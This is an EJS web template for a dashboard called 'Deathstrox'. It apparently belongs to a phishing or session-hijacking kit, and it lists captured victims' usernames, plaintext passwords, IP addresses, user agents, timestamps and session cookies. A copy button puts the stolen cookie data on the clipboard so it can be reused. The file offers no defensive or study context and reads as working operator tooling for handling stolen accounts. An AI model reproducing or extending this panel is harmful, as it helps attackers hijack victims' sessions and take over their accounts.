<!DOCTYPE html>
<html>

<head lang="en" dir="ltr">
    <title>Deathstrox</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="css/main.css">
    <meta name="viewport" content="width=device-width">
    <link rel="shortcut icon" type="image/jpg" href="https://i.gyazo.com/6b2ca21d7b3252b1a58e0f8b803f4262.jpg">
</head>

<body>
    <div class="header">
        <img src="https://i.gyazo.com/6b2ca21d7b3252b1a58e0f8b803f4262.jpg">
        <h1>
            Deathstrox
        </h1>
    </div>
   <div class="session">
       <table id="t01">
        <tr>
			<th>Session</th>
			<th>Username</th>
            <th>Password</th>
            <th >User IP</th>
            <th >User Agent</th>
            <th><br>Time<br><br></th>
            <th><br>Cookies</th>
        </tr>
        <%data.map(item=>{%>
            <tr>    
                <td style="word-break: break-all; font-size: 90%; padding: 20px 10px 20px 10px;"><%=item.id%></td>
                <td><%=item.username%></td>
                <td><%=item.password%></td>
                <td><%=item.remote_addr%></td>
                <td><%=item.useragent%></td>
                <td><%=JSON.stringify(new Date(item.create_time).toLocaleString())%></td>
                <td><button onclick="myFunction(this)">
                    Copy Details
                    <span style="display: none"><%=JSON.stringify(item.custom)%></span>
                </button>
                </td>
            </tr>
        <%})%>
        <script>
            function myFunction(ele) {
                var input = document.createElement('textarea');
                input.innerHTML = ele.children[0].innerText;
                document.body.appendChild(input);
                input.select();
                document.execCommand('copy');
                document.body.removeChild(input);
                alert("Copied the text: " + ele.children[0].innerText);
            }
        </script>
        
        
       </table>
   </div>
</body>

</html>